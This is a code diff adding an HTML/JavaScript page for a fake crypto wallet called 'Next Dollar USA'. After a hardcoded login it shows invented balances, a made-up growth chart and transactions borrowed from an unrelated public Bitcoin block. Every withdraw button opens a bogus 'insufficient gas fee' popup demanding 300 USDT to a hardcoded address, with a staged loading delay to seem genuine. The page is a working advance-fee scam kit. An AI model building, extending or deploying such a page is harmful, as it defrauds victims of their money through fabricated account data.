@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title data-translate="loginTitle">Next Dollar USA</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    <!-- Add language selector CSS if needed -->
+</head>
+<body>
+    <header>
+        <nav class="main-nav">
+             <div class="nav-links">
+                 <a href="index.html" data-translate="navHome">Home</a>
+                 <a href="about.html" data-translate="navAbout">About Us</a>
+                 <a href="contact.html" data-translate="navContact">Contact</a>
+             </div>
+            <div class="language-selector-container">
+                <select id="language-selector" onchange="setLanguage(this.value)">
+                    <option value="en">English</option>
+                    <option value="pt">Português</option>
+                    <option value="zh">中文</option>
+                    <option value="ru">Русский</option>
+                    <option value="es">Español</option>
+                </select>
+            </div>
+        </nav>
+    </header>
+    <div class="container login">
+        <img src="eagle-icon.png" alt="Coin Wallet USA" style="width: 50px; height: 50px;">
+        <h1 data-translate="loginTitle">Next Dollar USA</h1>
+        <input type="text" id="username" placeholder="Username" data-translate="usernamePlaceholder">
+        <input type="password" id="password" placeholder="Password" data-translate="passwordPlaceholder">
+        <button onclick="login()" data-translate="loginButton">Login</button>
+        <div class="ticker">
+            <p id="crypto-ticker" data-translate="tickerLoading">Loading top 100 cryptocurrencies...</p>
+        </div>
+    </div>
+
+    <div class="container wallet">
+        <h1 data-translate="welcomeMessage">Hi Mak, </h1>
+        <h2 data-translate="balancesTitle">Balances</h2>
+        <div class="crypto-icons">
+            <div class="crypto-icon-container">
+                <img src="btc-icon.png" alt="BTC" class="crypto-icon">
+                <p>BTC: <span id="btc-balance">3.0</span></p>
+                <p>USD: $<span id="btc-usd-value">0</span></p>
+                <button onclick="withdraw('btc')" data-translate="withdraw">Withdraw</button>
+            </div>
+            <div class="crypto-icon-container">
+                <img src="usdt-icon.png" alt="USDT" class="crypto-icon">
+                <p>USDT: <span id="usdt-balance">300.00</span></p>
+                <p>USD: $<span id="usdt-usd-value">300.00</span></p>
+                <button onclick="withdraw('usdt')" data-translate="withdraw">Withdraw</button>
+            </div>
+            <div class="crypto-icon-container">
+                <img src="eth-icon.png" alt="ETH" class="crypto-icon">
+                <p>ETH: <span id="eth-balance">2.345</span></p>
+                <p>USD: $<span id="eth-usd-value">0</span></p>
+                <button onclick="withdraw('eth')" data-translate="withdraw">Withdraw</button>
+            </div>
+            <div class="crypto-icon-container">
+                <img src="sol-icon.png" alt="SOL" class="crypto-icon">
+                <p>SOL: <span id="sol-balance">15.75</span></p>
+                <p>USD: $<span id="sol-usd-value">0</span></p>
+                <button onclick="withdraw('sol')" data-translate="withdraw">Withdraw</button>
+            </div>
+            <div class="crypto-icon-container">
+                <img src="ada-icon.png" alt="ADA" class="crypto-icon">
+                <p>ADA: <span id="ada-balance">500.0</span></p>
+                <p>USD: $<span id="ada-usd-value">0</span></p>
+                <button onclick="withdraw('ada')" data-translate="withdraw">Withdraw</button>
+            </div>
+            <div class="crypto-icon-container">
+                <img src="ltc-icon.png" alt="LTC" class="crypto-icon">
+                <p>LTC: <span id="ltc-balance">10.5</span></p>
+                <p>USD: $<span id="ltc-usd-value">0</span></p>
+                <button onclick="withdraw('ltc')" data-translate="withdraw">Withdraw</button>
+            </div>
+        </div>
+
+        <div class="charts">
+            <h3 data-translate="portfolioGrowthTitle">Portfolio Growth</h3>
+            <canvas id="growth-chart" width="300" height="150"></canvas>
+        </div>
+
+        <div class="transactions">
+            <h3 data-translate="transactionsTitle">Transactions</h3>
+            <div id="transactions-list" data-translate="transactionsLoading">Loading transactions...</div>
+        </div>
+    </div>
+
+    <div class="popup" id="withdraw-popup">
+        <h2 data-translate="insufficientGasTitle">Insufficient Gas Fee</h2>
+        <p data-translate="insufficientGasMessage">You need to deposit 300 USDT to cover the gas fees.</p>
+        <div>
+            <button onclick="closePopup()" data-translate="cancelButton">Cancel</button>
+            <button onclick="generateQRCode('usdt')" data-translate="payButton">Pay in USDT</button>
+        </div>
+    </div>
+
+    <div class="popup" id="payment-dialog" style="display: none;">
+        <h3 data-translate="paymentDialogTitle">USDT Payment</h3>
+        <div id="loading" class="loading" data-translate="paymentLoading">Generating your QR Code...</div>
+        <img src="" alt="Payment QR Code" class="qr-code" id="qr-code" style="display: none;">
+        <div id="payment-details" style="display: none;">
+            <p data-translate="paymentInstructions">Send 300 USDT to the address below (Network: BEP20):</p>
+            <div class="wallet-container">
+                <input type="text" id="wallet-address" value="0x8474CE97b6F06Fa1fF2b05Fb9265f6b0ea998CAA" readonly class="wallet-address">
+                <button class="copy-button" onclick="copyWalletAddress()" data-translate="copyButton">Copy</button>
+            </div>
+        </div>
+        <button onclick="closePaymentDialog()" data-translate="closeButton">Close</button>
+    </div>
+
+    <script src="translations.js"></script>
+    <script src="language.js"></script>
+    <script>
+        async function getExchangeRates() {
+            try {
+                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tether,solana,cardano,litecoin&vs_currencies=usd');
+                const data = await response.json();
+
+                const btcUsd = data.bitcoin.usd;
+                const ethUsd = data.ethereum.usd;
+                const usdtUsd = data.tether.usd;
+                const solUsd = data.solana.usd;
+                const adaUsd = data.cardano.usd;
+                const ltcUsd = data.litecoin.usd;
+
+                const btcBalance = parseFloat(document.getElementById('btc-balance').innerText);
+                const ethBalance = parseFloat(document.getElementById('eth-balance').innerText);
+                const usdtBalance = parseFloat(document.getElementById('usdt-balance').innerText);
+                const solBalance = parseFloat(document.getElementById('sol-balance').innerText);
+                const adaBalance = parseFloat(document.getElementById('ada-balance').innerText);
+                const ltcBalance = parseFloat(document.getElementById('ltc-balance').innerText);
+
+                document.getElementById('btc-usd-value').innerText = (btcBalance * btcUsd).toLocaleString('en-US', { minimumFractionDigits: 2 });
+                document.getElementById('eth-usd-value').innerText = (ethBalance * ethUsd).toLocaleString('en-US', { minimumFractionDigits: 2 });
+                document.getElementById('usdt-usd-value').innerText = (usdtBalance * usdtUsd).toLocaleString('en-US', { minimumFractionDigits: 2 });
+                document.getElementById('sol-usd-value').innerText = (solBalance * solUsd).toLocaleString('en-US', { minimumFractionDigits: 2 });
+                document.getElementById('ada-usd-value').innerText = (adaBalance * adaUsd).toLocaleString('en-US', { minimumFractionDigits: 2 });
+                document.getElementById('ltc-usd-value').innerText = (ltcBalance * ltcUsd).toLocaleString('en-US', { minimumFractionDigits: 2 });
+            } catch (error) {
+                console.error('Error fetching exchange rates:', error);
+            }
+        }
+
+        async function updateCryptoTicker() {
+            try {
+                const response = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=100&page=1');
+                const data = await response.json();
+                const ticker = data.map(coin => `${coin.name}: $${coin.current_price.toLocaleString('en-US', { minimumFractionDigits: 2 })}`).join(' | ');
+                document.getElementById('crypto-ticker').innerText = ticker;
+            } catch (error) {
+                console.error('Error updating ticker:', error);
+            }
+        }
+
+        async function fetchTransactions() {
+            try {
+                const response = await fetch('https://blockchain.info/rawblock/879360?cors=true');
+                const data = await response.json();
+                const transactions = data.tx.slice(0, 5);
+
+                const transactionsList = document.getElementById('transactions-list');
+                transactionsList.innerHTML = '';
+
+                transactions.forEach(tx => {
+                    const txElement = document.createElement('div');
+                    txElement.className = 'transaction';
+                    txElement.innerHTML = `
+                        <p><strong>TxID:</strong> <span class="txid">${tx.hash}</span></p>
+                        <button class="copy-button" onclick="copyToClipboard('${tx.hash}')">Copy</button>
+                        <p><strong>Amount:</strong> ${(tx.out[0].value / 100000000).toFixed(8)} BTC</p>
+                        <p><strong>To:</strong> ${tx.out[0].addr}</p>
+                    `;
+                    transactionsList.appendChild(txElement);
+                });
+            } catch (error) {
+                console.error('Error fetching transactions:', error);
+            }
+        }
+
+        function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if (username === 'worldcrypto@cypher.gov.us' && password === 'polkaDot') {
+                document.querySelector('.login').style.display = 'none';
+                document.querySelector('.wallet').style.display = 'block';
+                getExchangeRates();
+                fetchTransactions();
+                renderGrowthChart();
+            } else {
+                alert(translations[currentLanguage]["login_error"] || 'Invalid login credentials');
+            }
+        }
+
+        function withdraw(crypto) {
+            document.getElementById('withdraw-popup').style.display = 'block';
+        }
+
+        function closePopup() {
+            document.getElementById('withdraw-popup').style.display = 'none';
+        }
+
+        function generateQRCode(paymentMethod) {
+            const paymentDialog = document.getElementById("payment-dialog");
+            const loadingDiv = document.getElementById("loading");
+            const qrCodeImg = document.getElementById("qr-code");
+            const paymentDetailsDiv = document.getElementById("payment-details");
+
+            // 1. Show popup and loading message, hide QR/details
+            paymentDialog.style.display = "block";
+            loadingDiv.style.display = "block";
+            qrCodeImg.style.display = "none";
+            paymentDetailsDiv.style.display = "none";
+
+            // 2. Use a minimal timeout to ensure the loading state renders
+            setTimeout(() => {
+                // 3. Start the main delay to simulate QR generation
+                setTimeout(() => {
+                    qrCodeImg.src = "usdt-qr.png"; // Set QR source
+                    loadingDiv.style.display = "none"; // Hide loading
+                    qrCodeImg.style.display = "block"; // Show QR
+                    paymentDetailsDiv.style.display = "block"; // Show details
+                }, 4000); // Original 4-second delay
+            }, 50); // Short delay (50ms) to force render
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert(translations[currentLanguage]["tx_copied"] || 'TxID copied to clipboard!');
+            });
+        }
+
+        function copyWalletAddress() {
+            const walletAddress = document.getElementById('wallet-address');
+            walletAddress.select();
+            navigator.clipboard.writeText(walletAddress.value).then(() => {
+                alert(translations[currentLanguage]["wallet_copied"] || 'Wallet address copied to clipboard!');
+            });
+        }
+
+        function closePaymentDialog() {
+            document.getElementById('payment-dialog').style.display = 'none';
+        }
+
+        function renderGrowthChart() {
+            const ctx = document.getElementById('growth-chart').getContext('2d');
+            new Chart(ctx, {
+                type: 'line',
+                data: {
+                    labels: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
+                    datasets: [
+                        {
+                            label: 'Portfolio Value (BTC)',
+                            data: [5, 5.2, 5.5, 5.8, 5.6, 6, 6.1, 6.3, 6.7, 7, 7.2, 7.5],
+                            borderColor: '#1e90ff',
+                            fill: false,
+                        }
+                    ]
+                },
+                options: {
+                    responsive: true,
+                    plugins: {
+                        legend: {
+                            position: 'top',
+                        },
+                    },
+                }
+            });
+        }
+        document.addEventListener("DOMContentLoaded", () => {
+            // --- Language Initialization ---
+            const savedLang = localStorage.getItem("language") || "en";
+            setLanguage(savedLang); // Applies initial language and sets currentLanguage
+            const selector = document.getElementById("language-selector");
+            if (selector) {
+                selector.value = savedLang;
+            }
+
+            // --- Initial Data Fetch ---
+            // Only fetch ticker initially, exchange rates after login
+            updateCryptoTicker();
+
+            // --- Chatbot Elements ---
+            const chatbotToggler = document.getElementById("chatbot-toggler");
+            const closeChatbotBtn = document.getElementById("close-chatbot");
+            const chatbotPopup = document.getElementById("chatbot-popup");
+            const chatbox = document.getElementById("chatbox");
+            const chatInputArea = document.getElementById("chat-input-area");
+            const chatOptionsArea = document.getElementById("chat-options-area");
+            const chatInput = chatInputArea.querySelector("textarea");
+            const sendChatBtn = chatInputArea.querySelector("span"); // Assuming the span is the send button
+
+            // --- Chatbot Flow Definition ---
+            const chatFlow = {
+                start: {
+                    messageKey: "chatWelcome",
+                    options: [
+                        { textKey: "chatCategoryPlatform", next: "platform" },
+                        { textKey: "chatCategoryWithdrawal", next: "withdrawal" },
+                        { textKey: "chatCategorySecurity", next: "security" },
+                        { textKey: "chatCategoryHelp", next: "help" },
+                    ],
+                },
+                platform: {
+                    messageKey: "chatAskPlatform",
+                    options: [
+                        { textKey: "faq1Question", answerKey: "faq1Answer" },
+                        { textKey: "faq3Question", answerKey: "faq3Answer" },
+                        { textKey: "back", next: "start" },
+                    ],
+                },
+                withdrawal: {
+                    messageKey: "chatAskWithdrawal",
+                    options: [
+                        { textKey: "faq2Question", answerKey: "faq2Answer" },
+                        { textKey: "faq4Question", answerKey: "faq4Answer" },
+                        { textKey: "back", next: "start" },
+                    ],
+                },
+                security: {
+                    messageKey: "chatAskSecurity",
+                    options: [
+                        { textKey: "faq5Question", answerKey: "faq5Answer" },
+                        { textKey: "back", next: "start" },
+                    ],
+                },
+                help: {
+                    messageKey: "chatAskHelp",
+                    options: [
+                        { textKey: "faq6Question", answerKey: "faq6Answer" },
+                        { textKey: "back", next: "start" },
+                    ],
+                },
+            };
+
+            let currentChatState = "start";
+
+            // --- Chatbot Helper Functions ---
+            const appendMessage = (sender, messageHtml) => {
+                const chatLi = document.createElement("li");
+                chatLi.classList.add("chat", sender);
+                if (sender === "incoming") {
+                    chatLi.innerHTML = `<span class="material-icons">smart_toy</span><p>${messageHtml}</p>`;
+                } else {
+                    chatLi.innerHTML = `<p>${messageHtml}</p>`;
+                }
+                chatbox.appendChild(chatLi);
+                chatbox.scrollTo(0, chatbox.scrollHeight);
+            };
+
+            const displayOptions = (options) => {
+                chatOptionsArea.innerHTML = ""; // Clear previous options
+                const lang = window.currentLanguage || 'en'; // Get current language INSIDE the function
+                options.forEach((option) => {
+                    const button = document.createElement("button");
+                    const buttonText = translations[lang]?.[option.textKey] || option.textKey; // Use lang
+                    button.textContent = buttonText;
+                    // Add data attributes, ensuring they are strings
+                    if(option.next) button.dataset.next = String(option.next);
+                    if(option.answerKey) button.dataset.answerKey = String(option.answerKey);
+                    button.dataset.textKey = String(option.textKey); // Always add textKey
+                    button.addEventListener("click", handleOptionClick);
+                    chatOptionsArea.appendChild(button);
+                });
+                chatOptionsArea.style.display = "flex";
+                chatInputArea.style.display = "none"; // Hide text input when options are shown
+            };
+
+            const displayAnswer = (answerKey) => {
+                const lang = window.currentLanguage || 'en'; // Get current language INSIDE the function
+                console.log(`[Chatbot] displayAnswer called. lang: ${lang}, answerKey: ${answerKey}`);
+                const answerText = translations[lang]?.[answerKey] || "Sorry, I don't have information on that.";
+                if (!translations[lang]?.[answerKey]) {
+                    console.warn(`[Chatbot] Translation not found for key '${answerKey}' in language '${lang}'. Using fallback.`);
+                }
+                appendMessage("incoming", answerText);
+                // REMOVED: Automatic restart after answer
+                // setTimeout(() => {
+                //     currentChatState = "start";
+                //     displayChatState(currentChatState);
+                // }, 800);
+                // Instead, maybe show the previous options again or a generic prompt?
+                // For now, just show the answer and wait.
+            };
+
+            const displayChatState = (stateKey) => {
+                const state = chatFlow[stateKey];
+                if (!state) return;
+                const lang = window.currentLanguage || 'en'; // Get current language INSIDE the function
+                console.log(`[Chatbot] displayChatState called. stateKey: ${stateKey}, lang: ${lang}`); // LOGGING
+                const messageText = translations[lang]?.[state.messageKey] || state.messageKey;
+                appendMessage("incoming", messageText);
+                displayOptions(state.options); // displayOptions will also get the current lang
+            };
+
+            const handleOptionClick = (event) => {
+                const button = event.target;
+                const nextState = button.dataset.next;
+                const answerKey = button.dataset.answerKey;
+                const questionTextKey = button.dataset.textKey;
+                const lang = window.currentLanguage || 'en'; // Get current language INSIDE the function
+
+                console.log(`[Chatbot] handleOptionClick: nextState=${nextState}, answerKey=${answerKey}, questionTextKey=${questionTextKey}, lang=${lang}`);
+
+                const userMessageText = translations[lang]?.[questionTextKey] || questionTextKey;
+                appendMessage("outgoing", userMessageText);
+
+                if (answerKey && answerKey !== 'undefined') { // Check answerKey exists and is not the string 'undefined'
+                    console.log(`[Chatbot] Calling displayAnswer with key: ${answerKey}`);
+                    displayAnswer(answerKey); // displayAnswer will get the current lang
+                } else if (nextState && nextState !== 'undefined') { // Check nextState exists
+                    console.log(`[Chatbot] Transitioning to state: ${nextState}`);
+                    currentChatState = nextState;
+                    displayChatState(currentChatState); // displayChatState will get the current lang
+                } else {
+                    console.log("[Chatbot] Fallback/End of conversation reached.");
+                    // If no next state or answer, maybe go back to start?
+                    currentChatState = "start";
+                    displayChatState(currentChatState);
+                }
+            };
+
+            // --- Chatbot Initialization ---
+            const initializeChat = () => {
+                const lang = window.currentLanguage || 'en'; // Ensure we use the correct lang on init
+                console.log(`[Chatbot] Initializing chat with language: ${lang}`); // LOGGING
+                chatbox.innerHTML = ""; // Clear chatbox on init/language change
+                currentChatState = "start";
+                displayChatState(currentChatState); // This will now use the correct lang
+            };
+
+            // Override setLanguage to re-initialize chat on language change
+            const originalSetLanguage = window.setLanguage;
+            window.setLanguage = (lang) => {
+                console.log(`[Chatbot] setLanguage called with: ${lang}`); // LOGGING
+                originalSetLanguage(lang); // Call original function (updates UI and window.currentLanguage)
+                // Ensure chat re-initializes *after* the language context is fully updated
+                // Using setTimeout 0 helps push this to the end of the current execution stack
+                setTimeout(initializeChat, 0);
+            };
+
+            // --- Event Listeners ---
+            if (chatbotToggler) {
+                chatbotToggler.addEventListener("click", () => {
+                    const isOpening = !document.body.classList.contains("show-chatbot");
+                    document.body.classList.toggle("show-chatbot");
+                    if (isOpening) {
+                        initializeChat(); // Initialize chat when opening
+                    }
+                });
+            }
+
+            if (closeChatbotBtn) {
+                closeChatbotBtn.addEventListener("click", () => {
+                    document.body.classList.remove("show-chatbot");
+                });
+            }
+
+            // Note: Text input handling is currently disabled as we use buttons
+            // If you want to enable text input later, uncomment and adjust logic
+            /*
+            if (sendChatBtn) {
+                sendChatBtn.addEventListener('click', handleChat);
+            }
+            if (chatInput) {
+                 chatInput.addEventListener('keydown', (e) => {
+                    if(e.key === "Enter" && !e.shiftKey && window.innerWidth > 800) {
+                        e.preventDefault();
+                        handleChat();
+                    }
+                });
+            }
+            */
+        });    </script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+</body>
+</html>
+
+
+
+<!-- Chatbot Button -->
+<button class="chatbot-toggler" id="chatbot-toggler">
+    <span class="material-icons">mode_comment</span>
+    <span class="material-icons">close</span>
+</button>
+
+<!-- Chatbot Popup -->
+<div class="chatbot-popup" id="chatbot-popup">
+    <header>
+        <h2 data-translate="chatHeader">Chat</h2>
+        <span class="close-btn material-icons" id="close-chatbot">close</span>
+    </header>
+    <ul class="chatbox" id="chatbox">
+        <!-- Initial message will be added by JS -->
+    </ul>
+    <div class="chat-input" id="chat-input-area">
+        <!-- Input area will be replaced by buttons initially -->
+         <textarea placeholder="Enter a message..." spellcheck="false" required data-translate="chatPlaceholder" style="display: none;"></textarea>
+         <span id="send-chat-btn" class="material-icons" style="display: none;">send</span>
+    </div>
+    <div class="chat-options" id="chat-options-area">
+        <!-- Buttons will be added by JS -->
+    </div>
+</div>
+
